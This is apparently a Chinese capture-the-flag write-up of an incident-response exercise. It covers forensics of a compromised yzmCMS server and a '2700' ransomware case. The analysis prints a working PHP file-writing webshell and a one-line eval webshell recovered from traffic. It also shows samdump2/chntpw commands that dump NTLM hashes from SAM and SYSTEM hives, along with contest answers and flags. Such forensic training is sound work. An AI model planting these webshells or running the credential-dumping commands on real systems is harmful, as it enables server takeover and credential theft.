---
title: solar应急响应-2025.11月
date: 2026-07-01 17:54:16
tags:
  - solar
categories:
  - 比赛
---
## emergency

### 任务一

![](/img/posts/solar应急响应-2025.11月-1782899100619.webp)

![](/img/posts/solar应急响应-2025.11月-1782899107492.webp)

ip 10.0.100.69多次访问管理界面以及在932、894包在admin/system_manage/user_config_edit.html 表单提交了一句话木马

查看返回包，也显示操作成功

![](/img/posts/solar应急响应-2025.11月-1782899115817.webp)

![](/img/posts/solar应急响应-2025.11月-1782899124610.webp)

这里通过查看是yzmCMS内容管理系统，利用了CVE-2020-35971，一个XSS漏洞，攻击者可利用该漏洞在/admin/system_manage/user_config_edit.html页面注入JS代码。

### 任务二

![](/img/posts/solar应急响应-2025.11月-1782899134257.webp)

![](/img/posts/solar应急响应-2025.11月-1782899140791.webp)

根据一句话木马是shell

这里通过D盾查杀也能看出

![](/img/posts/solar应急响应-2025.11月-1782899146521.webp)

### 任务三

![](/img/posts/solar应急响应-2025.11月-1782899153419.webp)

查看日志可以看到10.0.100.69先是在进行目录扫描爆破，然后对这个yzmCMSuser_config_edit.html界面提交了一句话木马，初始连接的一句话木马是 `configs.cache.php`，然后紧接着访问了shell.php

![](/img/posts/solar应急响应-2025.11月-1782899159710.webp)

![](/img/posts/solar应急响应-2025.11月-1782899165932.webp)

这道题做的时候提取不出这个shell.php

![](/img/posts/solar应急响应-2025.11月-1782899173693.webp)

而且通过挂载这个.vmdk查找shell.php文件也找不到，然后赛后看其他的wp，发现可以根据这个shell.php文件的文件大小然后在回收站找到删除的同样大小的文件

通过追踪流查看一个返回包，得到了shell.php的大小43

![](/img/posts/solar应急响应-2025.11月-1782899178940.webp)

还有一种方法：因为是找创建新的一句话木马文件的MD5，直接wireshark筛”write“

![](/img/posts/solar应急响应-2025.11月-1782899193158.webp)

追踪流查看这个webshell的内容

![](/img/posts/solar应急响应-2025.11月-1782899198274.webp)

```bash
shell = @ini_set("display_errors", "0");
@set_time_limit(0);

$opdir = @ini_get("open_basedir");
if ($opdir) {
    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
    $oparr = preg_split(base64_decode("Lzt8Oi8="), $opdir);
    @array_push($oparr, $ocwd, sys_get_temp_dir());
    
    foreach ($oparr as $item) {
        if (!@is_writable($item)) {
            continue;
        };
        $tmdir = $item . "/.a5293";
        @mkdir($tmdir);
        if (!@file_exists($tmdir)) {
            continue;
        }
        $tmdir = realpath($tmdir);
        @chdir($tmdir);
        @ini_set("open_basedir", "..");
        $cntarr = @preg_split("/\\\\|\//", $tmdir);
        
        for ($i = 0; $i < sizeof($cntarr); $i++) {
            @chdir("..");
        };
        @ini_set("open_basedir", "/");
        @rmdir($tmdir);
        break;
    };
};

function asenc($out) {
    return $out;
};

function asoutput() {
    $output = ob_get_contents();
    ob_end_clean();
    echo "8484" . "cc18c";
    echo @asenc($output);
    echo "86bcb" . "d0c52";
}

ob_start();
try {
    $f = base64_decode(substr($_POST["d498cc0709be5f"], 2)); //解码文件名
    $c = $_POST["m58d3ef53bcb85"];    //获取文件内容
    $c = str_replace("\r", "", $c);
    $c = str_replace("\n", "", $c);
    $buf = "";
    
    for ($i = 0; $i < strlen($c); $i += 2) {
        $buf .= urldecode("%" . substr($c, $i, 2));
    }
    
    echo (@fwrite(fopen($f, "a"), $buf) ? "1" : "0");
} catch (Exception $e) {
    echo "ERROR://" . $e->getMessage();
};

asoutput();
die();
```

![](/img/posts/solar应急响应-2025.11月-1782899206655.webp)

十六进制转字符串，得到上传的文件内容 `<?php @eval($_POST["qsnctf_2025_lab"]); ?>`

![](/img/posts/solar应急响应-2025.11月-1782899212475.webp)

然后计算MD5，得到91a29f36879b024d661851b7765f3969

![](/img/posts/solar应急响应-2025.11月-1782899219221.webp)

### 任务四

![](/img/posts/solar应急响应-2025.11月-1782899227244.webp)

这里也是筛“write”

追踪流分析
![](/img/posts/solar应急响应-2025.11月-1782899233151.webp)
![](/img/posts/solar应急响应-2025.11月-1782899242384.webp)

得到

### 任务五

![](/img/posts/solar应急响应-2025.11月-1782899248788.webp)

过滤POST，查看分组字节流，69165包里base64解码看到了shell.exe

![](/img/posts/solar应急响应-2025.11月-1782899254358.webp)

### 任务六

![](/img/posts/solar应急响应-2025.11月-1782899262505.webp)

在发现shell.exe的包的前几个POST的包发现了

![](/img/posts/solar应急响应-2025.11月-1782899268855.webp)

![](/img/posts/solar应急响应-2025.11月-1782899274986.webp)

显然这就是上传的shell.exe文件的内容了，经过进制转换和MD5，得到0410284ea74b11d26f868ead6aa646e1

![](/img/posts/solar应急响应-2025.11月-1782899285882.webp)

### 任务七

![](/img/posts/solar应急响应-2025.11月-1782899293040.webp)

在上传这个shell.exe的包后面观察到
![](/img/posts/solar应急响应-2025.11月-1782899304265.webp)

得到 flag{4444}

### 任务八

![](/img/posts/solar应急响应-2025.11月-1782899321606.webp)

![](/img/posts/solar应急响应-2025.11月-1782899328706.webp)

![](/img/posts/solar应急响应-2025.11月-1782899335245.webp)

这里也是过滤POST请求，在73718包
### 任务九

![](/img/posts/solar应急响应-2025.11月-1782899344306.webp)

![](/img/posts/solar应急响应-2025.11月-1782899350270.webp)

得到密码P@ssw0rd123

![](/img/posts/solar应急响应-2025.11月-1782899355732.webp)

```bash
cd /mnt/c_drive/Windows/System32/config/
```

```bash
sudo chntpw -l SAM
[sudo] password for kali: 
chntpw version 1.00 140201, (c) Petter N Hagen
openHive(SAM) failed: Read-only file system, trying read-only
Hive <SAM> name (from header): <\SystemRoot\System32\Config\SAM>
ROOT KEY at offset: 0x001020 * Subkey indexing type is: 686c <lh>
File size 65536 [10000] bytes, containing 8 pages (+ 1 headerpage)
Used for data: 330/27744 blocks/bytes, unused: 21/12960 blocks/bytes.

| RID -|---------- Username ------------| Admin? |- Lock? --|
| 01f4 | Administrator                  | ADMIN  |          |
| 01f7 | DefaultAccount                 |        | dis/lock |
| 01f5 | Guest                          |        | dis/lock |
| 03e8 | hidden$                        | ADMIN  |          |

```

```bash
sudo chntpw -u "hidden$" -v SAM
chntpw version 1.00 140201, (c) Petter N Hagen
openHive(SAM) failed: Read-only file system, trying read-only
Hive <SAM> name (from header): <\SystemRoot\System32\Config\SAM>
ROOT KEY at offset: 0x001020 * Subkey indexing type is: 686c <lh>
###### Page at 0x1000 ofs_self 0x0, size (delta ofs_next) 0x1000 ######
###### Page at 0x2000 ofs_self 0x1000, size (delta ofs_next) 0x1000 ######
###### Page at 0x3000 ofs_self 0x2000, size (delta ofs_next) 0x1000 ######
###### Page at 0x4000 ofs_self 0x3000, size (delta ofs_next) 0x2000 ######
###### Page at 0x6000 ofs_self 0x5000, size (delta ofs_next) 0x1000 ######
###### Page at 0x7000 ofs_self 0x6000, size (delta ofs_next) 0x1000 ######
###### Page at 0x8000 ofs_self 0x7000, size (delta ofs_next) 0x2000 ######
###### Page at 0xa000 ofs_self 0x9000, size (delta ofs_next) 0x1000 ######
Last HBIN at offset       : 0xa000
First non-HBIN page offset: 0xb000
hdr->unknown4 (version?)  : 0x5
File size 65536 [10000] bytes, containing 8 pages (+ 1 headerpage)
Used for data: 330/27744 blocks/bytes, unused: 21/12960 blocks/bytes.

Type of hive guessed to be: 1
lmpw_offs: 0x10c, lmpw_len: 24 (0x18)
ntpw_offs: 0x124, ntpw_len: 56 (0x38)
================= USER EDIT ====================

RID     : 1000 [03e8]
Username: hidden$
fullname: 
comment : 
homedir : 

sam_get_user_grpids:  member path: \SAM\Domains\Builtin\Aliases\Members\S-1-5-21-1320223458-2853483990-1479821641\000003E8
sam_get_user_grpids:  member path: \SAM\Domains\Account\Aliases\Members\S-1-5-21-1320223458-2853483990-1479821641\000003E8
00000221 = Users (which has 3 members)
00000220 = Administrators (which has 2 members)

Account bits: 0x0010 =
[ ] Disabled        | [ ] Homedir req.    | [ ] Passwd not req. | 
[ ] Temp. duplicate | [X] Normal account  | [ ] NMS account     | 
[ ] Domain trust ac | [ ] Wks trust act.  | [ ] Srv trust act   | 
[ ] Pwd don't expir | [ ] Auto lockout    | [ ] (unknown 0x08)  | 
[ ] (unknown 0x10)  | [ ] (unknown 0x20)  | [ ] (unknown 0x40)  | 

Failed login count: 0, while max tries is: 0
Total  login count: 0
Crypted NT pw: 03 00 02 00 10 00 00 00 2f f8 a0 71 22 0a d7 81 
Crypted LM pw: 03 00 02 00 00 00 00 00 5f 12 4d 8c 0c 64 e9 c4 

- - - - User Edit Menu:
 1 - Clear (blank) user password
(2 - Unlock and enable user account) [seems unlocked already]
 3 - Promote user (make user an administrator)
 4 - Add user to a group
 5 - Remove user from a group
 q - Quit editing user, back to user select
Select: [q] > 

```

这里的 Crypted"并不是真正的加密，而是 RC4 加密的密文，需要用SYSTEM 文件解密才能得到真正的 NTLM 哈希。  
Windows 的密码哈希是用 **SYSKEY** 加密的，而 SYSKEY 存储在 **SYSKEY** 注册表文件中

![](/img/posts/solar应急响应-2025.11月-1782899371778.webp)

**使用 chntpw 同时加载 SAM 和 SYSTEM**

```bash
sudo chntpw -u "hidden$" -v /mnt/c_drive/Windows/System32/config/SAM /mnt/c_drive/Windows/System32/config/SYSTEM
```

由于我的**chntpw**版本过低，这里使用samdump2工具

```bash
samdump2 /mnt/c_drive/Windows/System32/config/SYSTEM /mnt/c_drive/Windows/System32/config/SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
hidden$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

### 任务十

![](/img/posts/solar应急响应-2025.11月-1782899418348.webp)

![](/img/posts/solar应急响应-2025.11月-1782899426162.webp)

事件查看器筛4720，得到时间

## **2700勒索病毒排查**

### 任务一
![](/img/posts/solar应急响应-2025.11月-1782899432841.webp)

![](/img/posts/solar应急响应-2025.11月-1782899445523.webp)

### 任务二
![](/img/posts/solar应急响应-2025.11月-1782899450901.webp)


**预留ID**是勒索病毒用来唯一标识受害者的一串字符，攻击者将其作为“凭证”，以便在收到赎金后提供对应的解密工具  
**文件命名格式**：原文件名.id-[预留ID].[攻击者邮箱].2700
![](/img/posts/solar应急响应-2025.11月-1782899460451.webp)


4A30C4F9-3524

### 任务三
![](/img/posts/solar应急响应-2025.11月-1782899525016.webp)
查看修改时间

flag{2025/11/19 14:31}

### 任务四
![](/img/posts/solar应急响应-2025.11月-1782899537712.webp)
![](/img/posts/solar应急响应-2025.11月-1782899548444.webp)
![](/img/posts/solar应急响应-2025.11月-1782899554745.webp)
![](/img/posts/solar应急响应-2025.11月-1782899565805.webp)
flag{6eff1ea09e63423a48288a77d97e0cc6}

### 任务五
![](/img/posts/solar应急响应-2025.11月-1782899575630.webp)
![](/img/posts/solar应急响应-2025.11月-1782899582118.webp)
[1983929223@qq.com](mailto:1983929223@qq.com)

### 任务六
![](/img/posts/solar应急响应-2025.11月-1782899587989.webp)
![](/img/posts/solar应急响应-2025.11月-1782899601598.webp)

39.91.141.213

### 任务七

![](/img/posts/solar应急响应-2025.11月-1782899612062.webp)

C2地址是网络攻击中攻击者用于控制受感染设备的服务器地址。

微步沙箱分析这个钓鱼邮件
![](/img/posts/solar应急响应-2025.11月-1782899621043.webp)
![](/img/posts/solar应急响应-2025.11月-1782899629142.webp)
这里显示两个ip 110.242.70.57和182.9.80.123

其中182.9.80.123很可能是恶意ip
![](/img/posts/solar应急响应-2025.11月-1782899637501.webp)
flag{182.9.80.123}

### 任务八
![](/img/posts/solar应急响应-2025.11月-1782899646164.webp)
利用工具diskgenius在桌面发现了flag.bak文件夹
![](/img/posts/solar应急响应-2025.11月-1782899652598.webp)
打开发现了flag:flag{92047522e5080bad36eda9d29d5a163e}